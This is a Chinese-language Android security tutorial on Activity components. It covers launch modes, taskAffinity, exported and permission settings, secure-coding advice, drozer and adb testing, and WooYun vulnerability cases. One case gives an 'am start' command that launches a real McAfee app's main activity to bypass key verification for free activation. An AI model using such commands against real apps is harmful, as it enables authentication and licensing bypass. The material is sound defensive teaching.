<p><a href="http://www.droidsec.cn/tag/activity/" class="st_tag internal_tag" rel="tag" title="Posts tagged with Activity">Activity</a> launch mode 用于控制创建task和Activity实例。默认“standard“模式。Standard模式一次启动即会生成一个新的Activity实例并且不会创建新的task，被启动的Activity和启动的Activity在同一个栈中。当创建新的task时，intent中的内容有可能被恶意应用读取所以建议若无特别需求使用默认的standard模式即不配置launch mode属性。launchMode能被Intent 的flag覆盖。</p>
<p><strong>taskAffinity</strong></p>
<p>android系统中task管理Activity。Task的命名取决于root Activity的affinity。</p>
<p>默认情况下，app中的每个Activity都使用app的包名作为affinity。而Task的分配取决于app，故默认情况下一个app中所有的Activity属于同一task。要改变task的分配，可以在AndroidManifest.xml文件中设置affinity的值，但是这样做会有不同task启动Activity携带的intent中的信息被其他应用读取的风险。</p>
<p><strong>FLAG_ACTIVITY_NEW_TASK</strong></p>
<p>intent flag中一个重要的flag</p>
<p>启动Activity时通过setFlags()或者addFlags()方法设置intent的flags属性能够改变launch mode，FLAG_ACTIVITY_NEW_TASK标记代表创建新的task（被启动的Activity既不在前台也不在后台）。FLAG_ACTIVITY_MULTIPLE_TASK标记能和FLAG_ACTIVITY_NEW_TASK同时设置。这种情况下必会创建的task，所以intent中不应携带敏感数据。</p>
<p><strong>Task</strong></p>
<p>stack:Activity承担了大量的显示和交互工作，从某种角度上将，我们看见的应用程序就是许多个Activity的组合。为了让这许多 Activity协同工作而不至于产生混乱，Android平台设计了一种堆栈机制用于管理Activity，其遵循先进后出的原则，系统总是显示位于栈顶的Activity，位于栈顶的Activity也就是最后打开的Activity。</p>
<p>Task:是指将相关的Activity组合到一起，以Activity Stack的方式进行管理。从用户体验上讲，一个“应用程序”就是一个Task，但是从根本上讲，一个Task是可以有一个或多个Android Application组成的</p>
<p>如果用户离开一个task很长时间，系统会清理栈顶以下的activity，这样task被从新打开时，栈顶activity就被还原了。</p>
<p><img src="Android Activtity Security _ DroidSec.cn_files/201411171045task2.png" alt=""></p>
<p><strong>Intent Selector</strong></p>
<p>多个Activity具有相同action时，当此调用此action时会弹出一个选择器供用户选择。</p>
<p><strong>权限</strong></p><!-- Crayon Syntax Highlighter v2.7.1 -->

		<div id="crayon-55a7a4b0716af795147207" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style="margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important; height: 18px !important; line-height: 18px !important; margin-top: -18px; display: none; z-index: 4;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码" style="display: none;"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><span class="crayon-language">Java</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly="" style="tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;">android:exported </textarea></div>
			<div class="crayon-main" style="position: relative; z-index: 1; overflow: hidden;">
				<table class="crayon-table">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-55a7a4b0716af795147207-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-55a7a4b0716af795147207-1"><span class="crayon-v">android</span><span class="crayon-o">:</span><span class="crayon-i">exported</span><span class="crayon-h"> </span></div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0009 seconds] -->
<p>一个Activity组件能否被外部应用启动取决于此属性，设置为true时Activity可以被外部应用启动，设置为false则不能，此时Activity只能被自身app启动。（同user id或者root也能启动）</p>
<p>没有配置intent-filter的action属性exported默认为false（没有filter只能通过明确的类名来启动activity故相当于只有程序本身能启动），配置了intent-filter的action属性exported默认为true。</p>
<p>exported属性只是用于限制Activity是否暴露给其他app，通过配置文件中的权限申明也可以限制外部启动activity。</p><!-- Crayon Syntax Highlighter v2.7.1 -->

		<div id="crayon-55a7a4b0716b6231379819" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style="margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important; height: 18px !important; line-height: 18px !important; margin-top: -18px; display: none; z-index: 4;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码" style="display: none;"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><span class="crayon-language">Java</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly="" style="tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;">android:protectionLevel </textarea></div>
			<div class="crayon-main" style="position: relative; z-index: 1; overflow: hidden;">
				<table class="crayon-table">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-55a7a4b0716b6231379819-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-55a7a4b0716b6231379819-1"><span class="crayon-v">android</span><span class="crayon-o">:</span><span class="crayon-i">protectionLevel</span><span class="crayon-h"> </span></div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0008 seconds] -->
<p><a href="http://developer.android.com/intl/zh-cn/guide/topics/manifest/permission-element.html">http://developer.android.com/intl/zh-cn/guide/topics/manifest/permission-element.html</a></p>
<p><img src="Android Activtity Security _ DroidSec.cn_files/201411171045permission.png" alt=""></p>
<p><img src="Android Activtity Security _ DroidSec.cn_files/201411171045permission2.jpg" alt=""></p>
<p>normal:默认值。低风险权限，只要申请了就可以使用，安装时不需要用户确认。</p>
<p>dangerous：像WRITE_SETTING和SEND_SMS等权限是有风险的，因为这些权限能够用来重新配置设备或者导致话费。使用此protectionLevel来标识用户可能关注的一些权限。Android将会在安装程序时，警示用户关于这些权限的需求，具体的行为可能依据Android版本或者所安装的移动设备而有所变化。</p>
<p>signature：这些权限仅授予那些和本程序应用了相同密钥来签名的程序。</p>
<p>signatureOrSystem:与signature类似，除了一点，系统中的程序也需要有资格来访问。这样允许定制Android系统应用也能获得权限，这种保护等级有助于集成系统编译过程。</p><!-- Crayon Syntax Highlighter v2.7.1 -->

		<div id="crayon-55a7a4b0716be858569827" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style="margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important; height: 18px !important; line-height: 18px !important; margin-top: -18px; display: none; z-index: 4;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><span class="crayon-language">Java</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly="" style="tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;">&lt;!-- *** POINT 1 *** Define a permission with protectionLevel="signature" --&gt; &lt;permission android:name="org.jssec.android.permission.protectedapp.MY_PERMISSION" android:protectionLevel="signature" /&gt; &lt;application android:icon="@drawable/ic_launcher" android:label="@string/app_name" &gt; &lt;!-- *** POINT 2 *** For a component, enforce the permission with its permission attribute --&gt; &lt;activity android:name=".ProtectedActivity" android:exported="true" android:label="@string/app_name" android:permission="org.jssec.android.permission.protectedapp.MY_PERMISSION" &gt; &lt;!-- *** POINT 3 *** If the component is an activity, you must define no intent-filter --&gt; &lt;/activity&gt; </textarea></div>
			<div class="crayon-main" style="position: relative; z-index: 1; overflow: hidden;">
				<table class="crayon-table">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-55a7a4b0716be858569827-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-55a7a4b0716be858569827-1"><span class="crayon-o">&lt;</span><span class="crayon-o">!</span><span class="crayon-o">--</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-o">*</span><span class="crayon-o">*</span><span class="crayon-h"> </span><span class="crayon-i">POINT</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-o">*</span><span class="crayon-o">*</span><span class="crayon-h"> </span><span class="crayon-i">Define</span><span class="crayon-h"> </span><span class="crayon-i">a</span><span class="crayon-h"> </span><span class="crayon-e">permission </span><span class="crayon-e">with </span><span class="crayon-v">protectionLevel</span><span class="crayon-o">=</span><span class="crayon-s">"signature"</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-e">permission </span><span class="crayon-v">android</span><span class="crayon-o">:</span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"org.jssec.android.permission.protectedapp.MY_PERMISSION"</span><span class="crayon-h"> </span><span class="crayon-v">android</span><span class="crayon-o">:</span><span class="crayon-v">protectionLevel</span><span class="crayon-o">=</span><span class="crayon-s">"signature"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-e">application </span><span class="crayon-v">android</span><span class="crayon-o">:</span><span class="crayon-v">icon</span><span class="crayon-o">=</span><span class="crayon-s">"@drawable/ic_launcher"</span><span class="crayon-h"> </span><span class="crayon-v">android</span><span class="crayon-o">:</span><span class="crayon-v">label</span><span class="crayon-o">=</span><span class="crayon-s">"@string/app_name"</span><span class="crayon-h"> </span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-o">!</span><span class="crayon-o">--</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-o">*</span><span class="crayon-o">*</span><span class="crayon-h"> </span><span class="crayon-i">POINT</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-o">*</span><span class="crayon-o">*</span><span class="crayon-h"> </span><span class="crayon-st">For</span><span class="crayon-h"> </span><span class="crayon-i">a</span><span class="crayon-h"> </span><span class="crayon-v">component</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">enforce </span><span class="crayon-e">the </span><span class="crayon-e">permission </span><span class="crayon-e">with </span><span class="crayon-e">its </span><span class="crayon-e">permission </span><span class="crayon-v">attribute</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-e">activity </span><span class="crayon-v">android</span><span class="crayon-o">:</span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">".ProtectedActivity"</span><span class="crayon-h"> </span><span class="crayon-v">android</span><span class="crayon-o">:</span><span class="crayon-v">exported</span><span class="crayon-o">=</span><span class="crayon-s">"true"</span><span class="crayon-h"> </span><span class="crayon-v">android</span><span class="crayon-o">:</span><span class="crayon-v">label</span><span class="crayon-o">=</span><span class="crayon-s">"@string/app_name"</span><span class="crayon-h"> </span><span class="crayon-v">android</span><span class="crayon-o">:</span><span class="crayon-v">permission</span><span class="crayon-o">=</span><span class="crayon-s">"org.jssec.android.permission.protectedapp.MY_PERMISSION"</span><span class="crayon-h"> </span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-o">!</span><span class="crayon-o">--</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-o">*</span><span class="crayon-o">*</span><span class="crayon-h"> </span><span class="crayon-i">POINT</span><span class="crayon-h"> </span><span class="crayon-cn">3</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-o">*</span><span class="crayon-o">*</span><span class="crayon-h"> </span><span class="crayon-st">If</span><span class="crayon-h"> </span><span class="crayon-e">the </span><span class="crayon-e">component </span><span class="crayon-st">is</span><span class="crayon-h"> </span><span class="crayon-e">an </span><span class="crayon-v">activity</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">you </span><span class="crayon-e">must </span><span class="crayon-e">define </span><span class="crayon-e">no </span><span class="crayon-v">intent</span><span class="crayon-o">-</span><span class="crayon-v">filter</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">activity</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span></div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0061 seconds] -->
<p><strong>关键方法</strong></p>
<ul>
<li>onCreate(Bundle savedInstanceState)</li>
<li>setResult(int resultCode, Intent data)</li>
<li>startActivity(Intent intent)</li>
<li>startActivityForResult(Intent intent, int requestCode)</li>
<li>onActivityResult(int requestCode, int resultCode, Intent data)</li>
<li>setResult (int resultCode, Intent data)</li>
<li>getStringExtra (String name)</li>
<li>addFlags(int flags)</li>
<li>setFlags(int flags)</li>
<li>setPackage(String packageName)</li>
<li>getAction()</li>
<li>setAction(String action)</li>
<li>getData()</li>
<li>setData(Uri data)</li>
<li>getExtras()</li>
<li>putExtra(String name, String value)</li>
</ul>
<h2>0x02 Activity分类</h2>
<hr>
<p>Activity类型和使用方式决定了其风险和防御方式,故将Activity分类如下： Private、Public、Parter、In-house</p>
<p><img src="Android Activtity Security _ DroidSec.cn_files/201411171045types.jpg" alt=""></p>
<h3>private activity</h3>
<hr>
<p>私有Activity不应被其他应用启动相对是安全的</p>
<p>创建activity时：</p>
<p>1、不指定taskAffinity //task管理activity。task的名字取决于根activity的affinity。默认设置中Activity使用包名做为affinity。task由app分配，所以一个应用的Activity在默认情况下属于相同task。跨task启动Activity的intent有可能被其他app读取到。</p>
<p>2、不指定lunchMode //默认standard，建议使用默认。创建新task时有可能被其他应用读取intent的内容。</p>
<p>3、设置exported属性为false</p>
<p>4、谨慎处理从intent中接收的数据，不管是否内部发送的intent</p>
<p>5、敏感信息只能在应用内部操作</p>
<p>使用activity时：</p>
<p>6、开启activity时不设置FLAG_ACTIVITY_NEW_TASK标签 //FLAG_ACTIVITY_NEW_TASK标签用于创建新task（被启动的Activity并未在栈中）。</p>
<p>7、开启应用内部activity使用显示启动的方式</p>
<p>8、当putExtra()包含敏感信息目的应是app内的activity</p>
<p>9、谨慎处理返回数据，即可数据来自相同应用</p>
<h3>public activity</h3>
<hr>
<p>公开暴露的Activity组件，可以被任意应用启动</p>
<p>创建activity：</p>
<p>1、设置exported属性为true</p>
<p>2、谨慎处理接收的intent</p>
<p>3、有返回数据时不应包含敏感信息</p>
<p>使用activity：</p>
<p>4、不应发送敏感信息</p>
<p>5、当收到返回数据时谨慎处理</p>
<p>Parter、in-house部分参阅<a href="http://www.jssec.org/dl/android_securecoding_en.pdf">http://www.jssec.org/dl/android_securecoding_en.pdf</a></p>
<p><strong>安全建议</strong></p>
<ul>
<li>app内使用的私有Activity不应配置intent-filter，如果配置了intent-filter需设置exported属性为false。</li>
<li>使用默认taskAffinity</li>
<li>使用默认launchMode</li>
<li>启动Activity时不设置intent的FLAG_ACTIVITY_NEW_TASK标签</li>
<li>谨慎处理接收的intent以及其携带的信息</li>
<li>签名验证内部（in-house）app</li>
<li>当Activity返回数据时候需注意目标Activity是否有泄露信息的风险</li>
<li>目的Activity十分明确时使用显示启动</li>
<li>谨慎处理Activity返回的数据，目的Activity返回的数据有可能是恶意应用伪造的</li>
<li>验证目标Activity是否恶意app，以免受到intent欺骗，可用hash签名验证</li>
<li>When Providing an Asset Secondhand, the Asset should be Protected with the Same Level of Protection</li>
<li>尽可能的不发送敏感信息，应考虑到启动public Activity中intent的信息均有可能被恶意应用窃取的风险</li>
</ul>
<h2>0x04 测试方法</h2>
<hr>
<p>查看activity：</p>
<ul>
<li>反编译查看配置文件AndroidManifest.xml中activity组件（关注配置了intent-filter的及未设置export=“false”的）</li>
<li>直接用RE打开安装后的app查看配置文件</li>
<li>Drozer扫描:run app.activity.info -a packagename</li>
<li>动态查看：logcat设置filter的tag为ActivityManager</li>
</ul>
<p>启动activity：</p>
<ul>
<li>adb shell：am start -a action -n package/componet</li>
<li>drozer: run app.activity.start –action android.action.intent.VIEW …</li>
<li>自己编写app调用startActiviy()或startActivityForResult()</li>
<li>浏览器intent scheme远程启动:http://drops.wooyun.org/tips/2893</li>
</ul>
<h2>0x05 案例</h2>
<hr>
<p><strong>案例1：绕过本地认证</strong></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2014-048502" target="_blank">WooYun: 华为网盘android客户端本地密码绕过（非root也可以）</a></p>
<p>绕过McAfee的key验证，免费激活。</p><!-- Crayon Syntax Highlighter v2.7.1 -->

		<div id="crayon-55a7a4b0716cb819945851" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style="margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important; height: 18px !important; line-height: 18px !important; margin-top: -18px; display: none; z-index: 4;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码" style="display: none;"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><span class="crayon-language">Java</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly="" style="tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;">$ am start -a android.intent.action.MAIN -n com.wsandroid.suite/com.mcafee.main.MfeMain </textarea></div>
			<div class="crayon-main" style="position: relative; z-index: 1; overflow: hidden;">
				<table class="crayon-table">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-55a7a4b0716cb819945851-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-55a7a4b0716cb819945851-1"><span class="crayon-sy">$</span><span class="crayon-h"> </span><span class="crayon-e">am </span><span class="crayon-v">start</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">a</span><span class="crayon-h"> </span><span class="crayon-v">android</span><span class="crayon-sy">.</span><span class="crayon-v">intent</span><span class="crayon-sy">.</span><span class="crayon-v">action</span><span class="crayon-sy">.</span><span class="crayon-v">MAIN</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">n</span><span class="crayon-h"> </span><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">wsandroid</span><span class="crayon-sy">.</span><span class="crayon-v">suite</span><span class="crayon-o">/</span><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">mcafee</span><span class="crayon-sy">.</span><span class="crayon-v">main</span><span class="crayon-sy">.</span><span class="crayon-i">MfeMain</span><span class="crayon-h"> </span></div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0015 seconds] -->
<p><img src="Android Activtity Security _ DroidSec.cn_files/201411171045mcafee.png" alt=""></p>
<p><strong>案例2：本地拒绝服务</strong></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2014-060423" target="_blank">WooYun: 快玩浏览器android客户端本地拒绝服务</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2013-036581" target="_blank">WooYun: 雪球android客户端本地拒绝服务漏洞</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2014-048176" target="_blank">WooYun: Tencent Messenger(QQ) Dos vulnerability(critical)</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2014-048501" target="_blank">WooYun: Tencent WeiBo multiple Dos vulnerabilities(critical)</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2014-077688" target="_blank">WooYun: Android原生的Settings应用存在必现崩溃问题（可造成拒绝服务攻击）</a>&nbsp;(涉及fragment)</p>
<p><strong>案例3：界面劫持</strong></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2012-05478" target="_blank">WooYun: android利用悬浮窗口实现界面劫持钓鱼盗号</a></p>
<p><strong>案例4：<a href="http://www.droidsec.cn/tag/uxss/" class="st_tag internal_tag" rel="tag" title="Posts tagged with UXSS">UXSS</a></strong></p>
<p>漏洞存在于Chrome Android版本v18.0.1025123，class “com.google.android.apps.chrome.SimpleChromeActivity” 允许恶意应用注入js代码到任意域. 部分 AndroidManifest.xml配置文件如下</p><!-- Crayon Syntax Highlighter v2.7.1 -->

		<div id="crayon-55a7a4b0716d4329438190" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style="margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important; height: 18px !important; line-height: 18px !important; margin-top: -18px; display: none; z-index: 4;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><span class="crayon-language">Java</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
